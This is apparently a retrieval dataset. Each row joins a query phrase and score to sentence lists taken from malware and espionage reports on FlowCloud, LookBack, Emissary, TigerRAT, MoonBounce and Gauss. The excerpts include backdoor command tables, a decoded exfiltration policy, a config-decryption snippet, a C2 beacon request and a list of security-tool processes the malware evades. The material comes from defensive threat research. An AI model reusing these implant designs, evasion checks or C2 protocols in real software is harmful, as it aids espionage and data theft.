'In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a .dat extension.', 'We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library.']
It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources|1.0000000000000002|['FlowCloud v4.1.3 This older version of FlowCloud has already been described in a Proofpoint blogpost and presents similarities to the newer version described in the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis.', 'This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed.', 'It checks running processes for executables of several known cybersecurity vendors.', 'While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses.', 'This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel.', 'It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources.', 'This library is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run.', 'Interestingly, the driver installed is the same as the one for version 5.0.2.', 'Those used by version 5.0.3 provide identical functionality, but differ slightly.', 'TA410 LookingFrog LookingFrog uses two main malware families: X4 and LookBack.', 'We have seen both of them on machines belonging to the same victim.']
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4|0.8174422213446632|['Modify the access controls of a given object using SetEntriesInAclA, 0x6D6E70D40 cacls SetNamedSecurityInfoA and BuildExplicitAccessWithName.', 'X4 provides basic functionalities to control the machine remotely, but it lacks more advanced spying capabilities.', 'LookBack 19/26The LookBack backdoor has previously been described by Proofpoint; we are therefore providing a quick summary and our analysis of the custom network protocol.', 'Backdoor In all samples we observed, the LookBack loader is a legitimate version of libcurl.dll with the curl_share_init (ordinal #52) export modified to load the SodomNormal communications module.', 'This corroborates the observation by Proofpoint researchers.', 'This module is embedded in the librarys resource section and encrypted with an algorithm similar to RC4.', 'The encryption/decryption function, shown in Figure 20, always uses the same key.', 'Figure 20.', 'Decompiled view of the function used to encrypt and decrypt the embedded module The SodomNormal component tries to read configuration information from a sodom.ini file.', 'This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.', 'If this file is unavailable or invalid, a hardcoded default configuration is used.']
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4|0.8174422213446632|['Custom hash function seen in X4The orchestrator handles seven commands, detailed in Table 3.', 'Output of these commands is written toC:\\\\ProgramData\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\Log\\\\output.log.Table 3.', 'X4 backdoor commandsIDNameDescription0x3ECFF9B9D92osloadWrite new encrypted shellcode toHKLM\\\\SOFTWARE\\\\Microsoft\\\\DRM\\\\X4Data.', 'It can also modifyX4KeyandPSKey.0x3F5FAFC0EDDpskillKill a process by PID.0x3F5FB1E6015pslistList the running processes usingCreateToolhelp32SnapshotandProcess32Next.0x3B6C27610D1injectDecrypt and injectshellcode, from encrypted form on disk, into memory.0xDA83E71execExecute a given command line.0xE9478DCliveGet the PID of the process in which the orchestrator is running.0x6D6E70D40caclsModify the access controls of a given object usingSetEntriesInAclA,SetNamedSecurityInfoA,andBuildExplicitAccessWithName.X4 provides basic functionalities to control the machine remotely, but it lacks more advanced spying capabilities.LookBackThe LookBack backdoor has previously been described byProofpoint; we are therefore providing a quick summary and our analysis of the custom network protocol.BackdoorIn all samples we observed, the LookBack loader is a legitimate version oflibcurl.dllwith thecurl_share_init(ordinal #52) export modified to load the SodomNormal communications module.', 'This corroborates the observation byProofpointresearchers.', 'This module is embedded in the librarys resource section and encrypted with an algorithm similar to RC4.', 'The encryption/decryption function, shown in Figure 20, always uses the same key.Figure 20.', 'Decompiled view of the function used to encrypt and decrypt the embedded moduleThe SodomNormal component tries to read configuration information from asodom.inifile.', 'This configuration file is encrypted using the just-described function and starts with the magic bytes0xAF1324BC.', 'If this file is unavailable or invalid, a hardcoded default configuration is used.A unique victim ID is then generated from the victims CPUID, username, and IP address.', 'This is sent to the server along with the computers name and the configuration data.']
Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.|1.0000000000000002|['Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity.', 'File system FlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database.', 'One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the smfile_search_policy.', 'It also creates an invisible window that listens for file creation, modification, or renaming events.', 'The corresponding files are collected unless they are excluded by that policy.', 'Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.', 'This same class collects file and directory metadata.', 'As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.', 'This includes bidirectional file transfers between the C&C and the compromised machine.', 'Programs and processes FlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface.', 'This functionality can also be invoked via a C&C command.']
Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.|0.7883683926745684|"['It can also update the local configuration when the corresponding command is received.As shown in Figure 13, parameters and frequency of automated actions can be specified and finely tuned through configuration policies.', 'Data exfiltration is likewise automated: policies can contain acache_sizeorcache_countparameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration.policys {                                                                                             keyboard_policy {                                                                                         state: true                                                                                           cycle_time: 60                                                                                         limit_size: 100                                                                                         cache_size: 10                                                                                        }                                                                                                screen_policy {                                                                                          state: true                                                                                           cycle_time: 30                                                                                         cache_count: 200                                                                                        bit_depth: 4                                                                                         }                                                                                                audio_policy {                                                                                          state: false                                                                                          cache_size: 100                                                                                         decibel_limit: 65                                                                                        continue_seconds: 15                                                                                     }                                                                                                smfile_search_policy {                                                                                      guid: ""XXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX""                                                                          state: false                                                                                          research: true                                                                                         inc_all_removable: true                                                                                     inc_all_fixed: true                                                                                       limit_size: 1                                                                                          recent_days: 30                                                                                         filter: ""*.doc""   filter: ""*.docx""                                                                                        filter: ""*.xls""                                                                                         filter: ""*.xlsx""                                                                                        filter: ""*.ppt""                                                                                         filter: ""*.pptx""                                                                                        filter: ""*.bmp""                                                                                         filter: ""*.jpg""                                                                                         filter: ""*.png""                                                                                         filter: ""*.gif""                                                                                         cache_size: 1024                                                                                        b_exclude_system_files: true                                                                                  b_exclude_system_folders: true  }                                                                                                installedapp_policy {                                                                                       state: false                                                                                         }                                                                                                clipboard_policy {                                                                                        state: false                                                                                          ignore_repeat: true                                                                                       cycle_time: 300                                                                                         limit_size: 100                                                                                         single_limit_size: 10                                                                                      cache_size: 50                                                                                        }                                                                                                user_activity_policy {                                                                                      process_activity_state: false                                                                                  browser_activity_state: false                                                                                 }                                                                                               }Figure 13.', 'Thepolicys[sic] section of a decoded FlowCloud configAs we have previously mentioned, this implant uses a lot of classes.', 'Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity.File systemFlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database.One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in thesmfile_search_policy.', 'It also creates an invisible window that listens for file creation, modification, or renaming events.', 'The corresponding files are collected unless they are excluded by that policy.Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.', 'This same class collects file and directory metadata.As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.', 'This includes bidirectional file transfers between the C&C and the compromised machine.Programs and processesFlowCloud is able to automatically obtain a list of installed software through the use of the undocumentedIShellAppManagerCOM interface.', 'This functionality can also be invoked via a C&C command.', 'Figure 14 shows, after the extraneous code has been removed, how that interface is used.Figure 14.', 'Simplified code showing how theIShellAppManagerCOM interface is used to list installed applicationsOther commands can be used to retrieve a detailed list of available services and currently running processes.Another interesting feature is the near real-time monitoring of process activity.']"
This includes bidirectional file transfers between the C&C and the compromised machine.|1.0000000000000002|['It also creates an invisible window that listens for file creation, modification, or renaming events.', 'The corresponding files are collected unless they are excluded by that policy.', 'Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.', 'This same class collects file and directory metadata.', 'As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives.', 'This includes bidirectional file transfers between the C&C and the compromised machine.', 'Programs and processes FlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface.', 'This functionality can also be invoked via a C&C command.', 'Figure 14 shows, after the extraneous code has been removed, how that interface is used.', '15/26Figure 14.', 'Simplified code showing how the IShellAppManager COM interface is used to list installed applications Other commands can be used to retrieve a detailed list of available services and currently running processes.']
is protected with DNGuard, a commercial .NET packer.|0.772174378143332|['Although the certificate has now been revoked, it was still valid when this sample was signed on August 10th, 2020.', '22/26Figure 23.', 'Digital signature of the QuasarRAT downloader This downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&C server http://ffca.caibi379[.', ']com, at /rwjh/new/.', 'This server was previously linked to FlowCloud (FlowingFrog).', 'The loader is named PresentationCache.exe and is protected with DNGuard, a commercial .NET packer.', 'It is also signed with the same certificate as the downloader.', 'It decrypts and loads the final QuasarRAT payload, which uses cahe.microsofts[.', ']org as its C&C server.', 'Conclusion TA410 is a cyberespionage umbrella targeting high-profile entities such as governments and universities worldwide.', 'ESET is revealing its latest findings about this group, including results from ongoing research, during Botconf 2022.']
uses both regular and reflective DLL injection.|0.8397905442059197|['Persistence Shell Create or Modify FlowCloud can be configured to create a service for T1543.003System Process: persistence.', 'Windows Service Obfuscated Files or T1027 FlowCloud files are distributed and stored in encrypted form.', 'Information Masquerading: The driver component of FlowCloud masquerades as a T1036.004Masquerade Task or mouse driver service.', 'Service Masquerading: Match Files named after legitimate utilities are written into the T1036.005Legitimate Name or %ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\ Location subdirectory.', 'FlowCloud uses a rootkit to hide its network traffic and T1014 Rootkit processes from system utilities.', 'Process Injection: FlowCloud uses both regular and reflective DLL injection.', 'It T1055.001Dynamic-link Library also manually loads some DLLs, bypassing calls to Injection LoadLibrary.', 'TA410s backdoors perform process injection to masquerade T1055 Process Injection as harmless processes.', 'Process Injection: One of FlowClouds DLLs replaces instructions in the loading Defense T1055.003Thread Execution process to make it execute code written in its memory.', 'Evasion Hijacking Process Injection: FlowCloud uses module stomping to hide the loading of its T1055.012 Process Hollowing main backdoor.', 'Deobfuscate/Decode Multiple TA410 backdoors communicate with their C&C T1140 Files or Information through encrypted and obfuscated channels.']
hostnames|0.8543396462566877|"[']com sites that redirected to credential harvesting pages hosted on *.frge[.]io.', 'These phishing links were also sent from email accounts that had been compromised prior by the APT group.', ""On 16 March, the Computer Emergency Response Team of Ukraine (CERT- UA) issued an alert that further highlighted how UAC-0028 (CERT-UA's name for FancyBear) was phishing UkrNet accounts, but this this time the APT group used the tinyurl[."", ']com URL-shortening service embedded inside a QR code the would lead to UkrNet credential havresting sites with *.frge[.', ']io and *.m.pipedream[.', ']net hostnames.', ""On 7 April, the Microsoft Threat Intelligence Center (MSTIC) and the Microsoft Digital Crimes Unit obtained a court order authorizing us to take control of seven internet domains Strontium (Microsoft's name for FancyBear) used to conduct phishing attacks against Ukrainian media organizations, as well as government institutions and think tanks in the US and the EU involved in foreign policy."", ""On 27 April, Microsoft's Special Report on Ukraine revealed additional details on Strontium's campaigns: In August 2021, Microsoft recorded Strontium targeting defense-related organizations in Ukraine."", 'https://blog.bushidotoken.net/2022/06/overview-of-russian-gru-and-svr.html 2/76/27/22, 3:46 PM Overview of Russian GRU and SVR Cyberespionage Campaigns 1H 2022 On 4 March, Microsoft specifically noted that the network of the government of Vinnytsia (a city in west-central Ukraine) was also compromised by Strontium and that sought access via phishing to other Ukrainian military personnel and regional Ukrainian government employee accounts.', 'In April, Microsoft observed Strontium and other suspected Russian nation state threat actors launch campaigns against or expand on existing access in the communications sector, targeting the IT infrastructure that supports the sector, and a major internet service provider (ISP).', 'On 3 May, Google TAG provided an update on cyber activity in Eastern Europe.']"
keylogging functionality.|0.8104468730407554|"['This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".']"
malicious code is embedded in code|0.7720399289717728|['A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORT Post-Soviet Bank Heists: A Hybrid Cybercrime StudyPost-Soviet Bank Heists: A Hybrid Cybercrime Study Authors Thanassis Diogos EMEA Managing Consultant, Incident Response, Trustwave Sachin Deodhar EMEA Incident Response Consultant, Trustwave Research and Publication Rodel Mendrez and Gerald Carsula Malware Research Team, Trustwave Table of Contents Introduction .', '.', '.', '.', '.', '.', '.']
Download a file from the C2 server|0.7971446437979285|['The Emissary Trojan will use this GUID value provided by the C2 server as an encryption key that it will use to encrypt data sent in subsequent network communications.', 'Figure 8 C2 response to Emissary beacon The C2 server provides commands to the Trojan as a three digit numeric string within the data portion of the HTTP response (in the form of op=<command>), which the Emissary Trojan will decrypt and compare to a list of commands within its command handler.', 'The command handler function within the Emissary Trojan supports six commands, as seen in Table 2.', 'Command Description 102 Upload a file to the C2 server.', '103 Executes a specified command.', '104 Download file from the C2 server.', '105 Update configuration file.', '106 Create a remote shell.', '107 Updates the Trojan with a new executable.', 'Table 2 Command handler within Emissary version 5.3 If the command issued from the C2 server does not match the one listed in the Trojan saves the message unkown:%s to the log file.', 'The command set available within Emissary allows the threat actors backdoor access to a compromised system.']
Download a file from the C2 server|0.7971446437979285|['The Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will decrypt with a new algorithm as seen in the following: 1 SetFilePointer(h_config_file_1, 0x488, 0, 0); 2 ReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 0); 3 CloseHandle(h_config_file); 4 srand(0xA03u); 5 iteration_count = 0; 6 do 7 *(buffer_for_config + iteration_count++) ^= rand() % 128; 8 while ( iteration_count < 0x84 ); The configuration structure has also changed as well, with Emissary now using the following structure: 1 struct emissary_new_config { 2 WORD Emissary_version_major; 3 WORD Emissary_version_minor; 4 CHAR[36] GUID_for_sample; 5 WORD Unknown1; 6 CHAR[128] Server1; 7 CHAR[128] Server2; 8 CHAR[128] Server3; 9 CHAR[128] CampaignName; 10 CHAR[550] Unknown2; 11 WORD Delay_interval_seconds; 12 }; This version of Emissary also introduced a new command handler that uses number-based commands instead of the GUID commands seen in prior versions of Emissary.', 'The functionality of the commands are the same, however, the commands themselves are invoked using a number.', 'Table 2 contains a list of available commands and a brief description of the functionality carried out by the command.', 'Command Description 102 Upload a file to the C2 server.', '103 Executes a specified command.', '104 Download file from the C2 server.', '105 Update configuration file.', 'http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/ 11/182016/10/31 Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve?', '- Palo Alto Networks Blog 106 Create a remote shell.', '107 Updates the Trojan with a new executable.', 'Table 2: New Emissary command handler The network beacon sent from this version of Emissary is very similar to the beacon first introduced in Emissary version 2.0; however, the op value of 101 is hardcoded for the beacon and replaces the GUID based op designator to match the new command handler.']
Download a file from the C2 server|0.7636846034222042|"['8/21Code Snippet: CrimsonRAT command handler.', 'Seen in: Jan-Feb 2022: Deployed by Kavach-themed downloaders.', 'Lightweight implant A new lightweight, .NET-based implant was also seen in this campaign in several infection chains.', 'This implant has limited capabilities when compared to CrimsonRAT but contains enough functionality to control and monitor the infected system.', 'Capabilities include: List all running processes on the endpoint.', 'Download and execute a file from the C2.', 'Download and execute a file specified by the C2 from another remote location.', 'Close connection with the C2 until the next run.', 'Gather system information from the endpoint such as Computer Name, username, public and local IPs, Operating system name, list of runnings AVs, device type (desktop or laptop).', ""The implant also persists via an InternetShortcut in the current user's Startup directory."", 'Implant downloading and executing a file from a remote location.']"
Download a file from the C2 server|0.7971446437979285|['The Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will decrypt with a new algorithm as seen in the following: 1 SetFilePointer(h_config_file_1, 0x488, 0, 0); 2 ReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 3 CloseHandle(h_config_file); 4 srand(0xA03u); 5 iteration_count = 0; 6 do 7 *(buffer_for_config + iteration_count++) ^= rand() % 128; 8 while ( iteration_count < 0x84 ); The configuration structure has also changed as well, with Emissary now using the following structure: 1 struct emissary_new_config { 2 WORD Emissary_version_major; 3 WORD Emissary_version_minor; 4 CHAR[36] GUID_for_sample; 5 WORD Unknown1; 6 CHAR[128] Server1; 7 CHAR[128] Server2; 8 CHAR[128] Server3; 9 CHAR[128] CampaignName; 10 CHAR[550] Unknown2; 11 WORD Delay_interval_seconds; 12 }; This version of Emissary also introduced a new command handler that uses number-based commands instead of the GUID commands seen in prior versions of Emissary.', 'The functionality of the commands are the same, however, the commands themselves are invoked using a number.', 'Table 2 contains a list of available commands and a brief description of the functionality carried out by the command.', 'Command Description 102 Upload a file to the C2 server.', '103 Executes a specified command.', '104 Download file from the C2 server.', '105 Update configuration file.', '106 Create a remote shell.', '107 Updates the Trojan with a new executable.', 'Table 2: New Emissary command handler The network beacon sent from this version of Emissary is very similar to the beacon first introduced in Emissary version 2.0; however, the op value of 101 is hardcoded for the beacon and replaces the GUID based op designator to match the new command handler.', 'The following is an example of the network beacon generated by this version of Emissary:1 GET /default.aspx HTTP/1.1 2 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1) 3 Host: 101.55.33.92 4 Cache-Control: no-cache 5 Cookie: guid=cae5e213-395a-4023-9a12-f78d3c4718e5; op=101 Date: 8/25/2015 SHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original Name: WinDLL.dll Emissary version 5.0 closely resembles the out-of-order version 3.0 sample, which suggests that the malware author just forgot to change the version number of the out of order sample.']
the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices|0.8637286166815011|['MoonBounce is notable for being the third publicly revealed case of an implant from the latter class of firmware- based rootkits.', 'Previous cases included LoJax and MosaicRegressor, which we reported on during October 2020.', 'In that sense, MoonBounce marks a particular evolution in this group of threats by presenting a more complicated attack flow in comparison to its predecessors and a higher level of technical competence by its authors, who demonstrate a thorough understanding of the finer details involved in the UEFI boot process.', 'Our discovery: a sophisticated implant within UEFI firmware The UEFI implant, which was detected in spring 2021 , was found to have been incorporated by the attackers into the CORE_DXE component of the firmware (also known as the DXE Foundation), which is called early on at the DXE (Driver Execution Environment) phase of the UEFI boot sequence.', 'Among other things, this component is responsible for initializing essential data structures and function interfaces, one of which is the EFI Boot Services Table a set of pointers to routines that are part of the CORE_DXE image itself and are callable by other DXE drivers in the boot chain.', 'The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.', 'Those hooks are used to divert the flow of these functions to malicious shellcode that is appended by the attackers to the CORE_DXE image, which in turn sets up additional hooks in subsequent components of the boot chain, namely the Windows loader.', 'This multistage chain of hooks facilitates the propagation of malicious code from the CORE_DXE image to other boot components during system startup, allowing the introduction of a malicious driver to the memory address space of the Windows kernel.', 'This driver, which runs during the initial phases of the kernels execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.', 'Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e.', 'hxxp://mb.glbaitech[.']
the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices|0.8637286166815011|['MoonBounce is notable for being the third publicly revealed case of an implant from the latter class of firmware-based rootkits.', 'Previous cases included LoJax and MosaicRegressor, which we reported on during October 2020.', 'In that sense, MoonBounce marks a particular evolution in this group of threats by presenting a more complicated attack flow in comparison to its predecessors and a higher level of technical competence by its authors, who demonstrate a thorough understanding of the finer details involved in the UEFI boot process.', 'Our discovery: a sophisticated implant within UEFI firmware The UEFI implant, which was detected in spring 2021 , was found to have been incorporated by the attackers into the CORE_DXE component of the firmware (also known as the DXE Foundation), which is called early on at the DXE (Driver Execution Environment) phase of the UEFI boot sequence.', 'Among other things, this component is responsible for initializing essential data structures and function interfaces, one of which is the EFI Boot Services Table a set of pointers to routines that are part of the CORE_DXE image itself and are callable by other DXE drivers in the boot chain.', 'The source of the infection starts with a set of hooks that intercept the execution of several functions in the EFI Boot Services Table, namely AllocatePool, CreateEventEx and ExitBootServices.', 'Those hooks are used to divert the flow of these functions to malicious shellcode that is appended by the attackers to the CORE_DXE image, which in turn sets up additional hooks in subsequent components of the boot chain, namely the Windows loader.', 'This multistage chain of hooks facilitates the propagation of malicious code from the CORE_DXE image to other boot components during system startup, allowing the introduction of a malicious driver to the memory address space of the Windows kernel.', 'This driver, which runs during the initial phases of the kernels execution, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.', 'Finally, the user mode malware reaches out to a hardcoded C&C URL (i.e.', 'hxxp://mb.glbaitech[.']
an encrypted blob|0.7586635781282959|['adhybridhealth .', 'azure .', 'com/providers/Microsoft.ADHybridHealthService/monitoringpolicies/<service_id>/keys/BlobUploadKeyThe<service_id>refers to the ID of the AD FS service registered to Azure AD during the first agent installation.', 'This ID is not shown in the Azure Portal, but it is stored in the HKLM\\\\SOFTWARE\\\\Microsoft\\\\ADHealthAgent\\\\ADFS\\\\ServiceId registry.The Service Access Token from the previous step is included in the Authorization header:Authorization: Bearer<service access token>The response to a successful request contains a URL for theBlob storagewith a valid shared access signature (SAS) token.', 'The<service_id>is the same service ID sent in the request.https: //adhsprodweuaadsynciadata .', 'blob .', 'core .', 'windows .', 'net/adfederationservice-<service_id>?sv=2018-03-28&sr=c&sig=RCrQOWOLr%2FjHIX6%2FxCti1bPmbHgkp4T9eLS07uP%2FyKM%3D&se=2021-07-10T08%3A01%3A46Z&sp=wThe agent gets an Event Publisher Key that is required to send the signature of the events blob to Azure AD.', 'Azure AD uses this signature to verify that the event information uploaded by the Azure AD Connect Health agent is authentic.', 'Azure AD starts processing the event information uploaded to Blob storage only after it receives a notification via Azure Service Bus that contains this signature.The Event Publisher Key is fetched by making a HTTP GET request to the following location.']
an encrypted configuration file|0.9135621256040132|['It writes itself in files: and modifies the %system32%\\\\wbem\\\\wmiqry32.dll, %system32%\\\\wbem\\\\wmihlp32.dll system registry to be loaded instead of file.', '%system32%\\\\wbem\\\\wbemsvc.dll To achieve this, it writes the following registry value: [HKCR\\\\CLSID\\\\{7C857801-7381-11CF-884D-00AA004B2E24}\\\\InProcServer32] Default = %system32%\\\\wbem\\\\wmihlp32.dll Operation The module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShellHWStop, Global\\\\ShellHWDetectionEvent events, mutex ShellHWDetectionMutex.', '12The main thread exits if the following processes were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwall.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lookout.exe savprogress.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHook.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Sniffer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe sppfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewallsvc.exe ssupdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgaccount.exe CavAUD.exe ipatrol.exe webwall.exe privatefirewall3.exe CavEmSrv.exe pcipprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rtt_crc_service.exe Cavvl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavApp.exe privatefirewall3.exe avas.exe sdtrayapp.exe CavCons.exe pfft.exe avcom.exe siteadv.exe CavMud.exe armorwall.exe avkproxy.exe sndsrvc.exe CavUMAS.exe app_firewall.exe avkservice.exe snsmcon.exe UUpd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4ss.exe avtask.exe avkwctl.exe CavQ.exe tppfdmn.exe aws.exe firewall.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rsser.exe bgnt.exe spybotsd.exe OnAccessInstaller.exe op_mon.exe bootsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bullguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewall.exe Packetyzer.exe wwasher.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13zerospywarelite_installer.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewall.exe ashdisp.exe rawshark.exe vdtask.exe firewall2004.exe ashmaisv.exe Ethereal.exe asr.exe firewallgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.', 'Gauss ShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%\\\\system32\\\\winshell.ocx %temp%\\\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\dskapi.ocx %temp%\\\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\smdk.ocx %temp%\\\\~mdk.tmp String values from config file (example) 14Every module is loaded and its export functions are called as specified in the configuration.', 'Most of the actions are logged in an encrypted (with XOR) file %temp%\\\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.', 'Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.']
an encrypted configuration file|0.9135621256040132|['It is possible that during initial infection, only the ShellHW component is installed, which then installs the other modules.ShellHW (file name wmiqry32.dll/wmihlp32.dll) is the main component of the malware which ensures that all other Gauss modules are loaded when the malware starts and operate correctly.Comparison with FlameAs we mentioned above, there are significant similarities in code and architecture between Gauss and Flame.', 'In fact, it is largely due to these similarities that Gauss was discovered.', 'We created the following table for a clearer understanding of these facts and proof of kinship between the two attack platforms:FeatureFlameGaussModular architectureYesYesUsing kernel driversNoNo.OCX files extensionsYesYesConfiguration settingsPredefined in main bodyStored in registryDLL injectionsYesYesVisual C++YesYesEncryption methodsXORXORUsing USB as storageYes (hub001.dat)Yes (.thumbs.db)Embedded LUA scriptingYesNoBrowser history/cookies stealerYes (soapr32/nteps32)Yes (winshell)CVE2010-2568 (.LNK exploit)Yes (target.lnk)Yes (target.lnk)C&C communicationhttpshttpsLog files/stolen data stored in %temp%YesYesZlib compression of collected dataYesYesIn addition to the features listed above, there are considerable similarities in the operation of the Flame and Gauss C&C servers.', 'The relevant analysis is provided in the C&C Communication section.There are more similarities in the code and data of the modules:Wmiqry32/Wmihlp32.dll aka ShellHWInstalled by: Unknown dropperOperates in two modes: installation and normal operation.File names%system32%wbemwmiqry32.dll%system32%wbemwmihlp32.dllSome known MD5C3B8AD4ECA93114947C777B19D3C605908D7DDB11E16B86544E0C3E677A60E10055AE6B8070DF0B3521D78E1B8D2FCE4FA54A8D31E1434539FBB9A412F4D32FF01567CA73862056304BB87CBF797B89923D956C297C67D94F591FCB574D9325FImage Size258 048 bytesNumber of resources7Resources121, 131, 141, 151, 161, 171, 181Date of compilationJun 1 2011Jul 16 2011Jul 18 2011Sep 28 2011Oct 20 2011Related files%temp%~shw.tmp%temp%~stm.tmpInstallationThe module checks if it was loaded by lsass.exe process and, if true, proceeds with the installation.It writes itself in files: %system32%wbemwmiqry32.dll, %system32%wbemwmihlp32.dll and modifies the system registry to be loaded instead of %system32%wbemwbemsvc.dll file.To achieve this, it writes the following registry value:[HKCRCLSID{7C857801-7381-11CF-884D-00AA004B2E24}InProcServer32] Default = %system32%wbemwmihlp32.dllOperationThe module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.The module creates ShellHWStop, GlobalShellHWDetectionEvent events, mutex ShellHWDetectionMutex.The main thread exits if the following processes were found at its 